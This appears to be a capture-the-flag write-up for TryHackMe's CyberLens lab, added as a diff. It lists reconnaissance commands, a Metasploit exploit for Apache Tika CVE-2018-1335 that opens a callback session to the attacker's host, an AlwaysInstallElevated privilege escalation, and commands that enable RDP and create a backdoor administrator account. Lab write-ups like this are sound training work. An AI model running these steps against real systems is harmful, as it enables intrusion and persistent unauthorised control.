@@ -1,0 +1,114 @@
+CTF Write-Up: CyberLens
+
+TryHackMe
+
+1. Basic Information
+
+Platform: TryHackMe
+
+Machine: CyberLens
+
+Difficulty: Easy
+
+Operating system: Windows
+
+2. Reconnaissance
+
+I began by scanning the target to identify open ports, the services running on them, their versions, and potential entry points.
+
+I also added the cyberlens.thm hostname to /etc/hosts, mapping it to the target machine’s IP address.
+
+Command:
+
+nmap -sV -sC -p- TARGET-IP -oN cyberlens.txt
+
+The scan returned the following open ports and services:
+
+80/tcp       open  http
+135/tcp      open  msrpc
+139/tcp      open  netbios-ssn
+445/tcp      open  microsoft-ds?
+3389/tcp     open  ms-wbt-server
+760/tcp      open  pando-pub?
+5985/tcp     open  http
+47001/tcp    open  http
+49664-49671/tcp open msrpc
+49675/tcp    open  msrpc
+61777/tcp    open  http
+
+I checked the HTTP services on the discovered ports. The most interesting services were the website at http://cyberlens.thm (port 80) and the service on port 61777. I began by enumerating the main website.
+
+3. Enumeration
+
+After visiting the website, I performed basic enumeration by inspecting its source code, cookies, and network activity, and by testing the available functionality. While reviewing the source code, I discovered the endpoint http://cyberlens.thm:61777/meta and noted it for further investigation.
+
+Since the room focuses on metadata, I also downloaded the available images from the website and examined their metadata. However, I did not find anything useful.
+
+I then investigated the Apache Tika 1.17 service running on port 61777. I found that this version was vulnerable to CVE-2018-1335, a command-injection vulnerability.
+
+I located exploits on Exploit-DB and through SearchSploit, but they did not work in my environment, so I switched to Metasploit.
+
+4. Initial Access
+
+I launched msfconsole and searched for an Apache Tika exploit.
+
+Commands:
+
+msfconsole
+search tika
+use exploit/windows/http/apache_tika_jp2_jscript
+set RHOSTS TARGET-IP
+set ForceExploit true
+set LHOST IP-ADDRESS
+set LPORT 4444
+set RPORT 61777
+set SRVHOST IP-ADDRESS
+run
+
+The exploit succeeded, and I received a session on the target.
+
+5. Post-Exploitation Enumeration and Privilege Escalation
+
+I started a command shell to access a basic Windows command prompt. I then backgrounded the session so I could continue using Metasploit without terminating it.
+
+I ran the local exploit suggester:
+
+use multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+The target was vulnerable to the AlwaysInstallElevated technique. I used the following Metasploit module to escalate privileges to NT AUTHORITY\\SYSTEM:
+
+use exploit/windows/local/always_install_elevated
+set LHOST IP-ADDRESS
+set LPORT 5555
+
+I verified the privilege escalation by running whoami. The output confirmed that I had NT AUTHORITY\\SYSTEM privileges.
+
+6. Enabling RDP and Creating an Administrator Account
+
+After escalating privileges, I enabled Remote Desktop Protocol (RDP) and created a local user account with administrator privileges so I could interact with the target through a graphical session.
+
+Commands:
+
+reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+net user USERNAME PASSWORD /add
+net localgroup "Administrators" USERNAME /add
+net localgroup "Remote Desktop Users" USERNAME /add
+
+I then connected to the target using RDP:
+
+xfreerdp /v:TARGET-IP /u:USERNAME /p:PASSWORD
+
+7. Retrieving the Flags
+
+I searched the C: drive for flag files:
+
+where /R C:\\ flag.txt
+
+To read a flag, I used the type command with the path returned by the search:
+
+type "FLAG-PATH"
